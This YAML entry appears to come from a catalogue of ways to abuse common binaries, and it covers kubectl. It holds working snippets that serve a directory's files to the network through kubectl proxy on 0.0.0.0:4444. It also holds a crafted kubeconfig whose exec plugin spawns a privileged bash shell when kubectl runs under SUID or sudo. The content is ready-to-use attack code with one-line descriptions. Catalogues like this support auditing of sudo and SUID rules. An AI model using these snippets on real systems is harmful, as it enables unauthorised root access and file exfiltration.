---
functions:
  file-upload:
    - code: |
        LFILE=dir_to_serve
        kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
      description: "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`."
  suid:
    - code: |
        LFILE=dir_to_serve
        ./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
      description: "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`." 
    - code: |-
        cat << EOF > /tmp/config
        apiVersion: v1
        clusters:
        - cluster:
            server: https://test
          name: kubernetes
        contexts:
        - context:
            cluster: kubernetes
            user: kubernetes-admin
          name: kubernetes-admin@kubernetes
        current-context: kubernetes-admin@kubernetes
        kind: Config
        preferences: {}
        users:
        - name: kubernetes-admin
          user:
            exec:
              apiVersion: client.authentication.k8s.io/v1
              command: /bin/bash
              args: 
                - "-p"
                - "-c"
                - "/bin/bash -p </dev/tty >/dev/tty 2>/dev/tty"
              interactiveMode: Always
        EOF
        ./kubectl get pods --kubeconfig=/tmp/config 
      description: "It pops a new privileged shell using custom configuration"
  sudo: 
    - code: |
        LFILE=dir_to_serve
        sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
      description: "It serves files from a specified directory via HTTP, i.e., `http://<IP>:4444/x/<file>`."
    - code: |-
        cat << EOF > /tmp/config
        apiVersion: v1
        clusters:
        - cluster:
            server: https://test
          name: kubernetes
        contexts:
        - context:
            cluster: kubernetes
            user: kubernetes-admin
          name: kubernetes-admin@kubernetes
        current-context: kubernetes-admin@kubernetes
        kind: Config
        preferences: {}
        users:
        - name: kubernetes-admin
          user:
            exec:
              apiVersion: client.authentication.k8s.io/v1
              command: /bin/bash
              args: 
                - "-p"
                - "-c"
                - "/bin/bash -p </dev/tty >/dev/tty 2>/dev/tty"
              interactiveMode: Always
        EOF
        ./kubectl get pods --kubeconfig=/tmp/config 
      description: "It pops a new privileged shell using custom configuration"
---
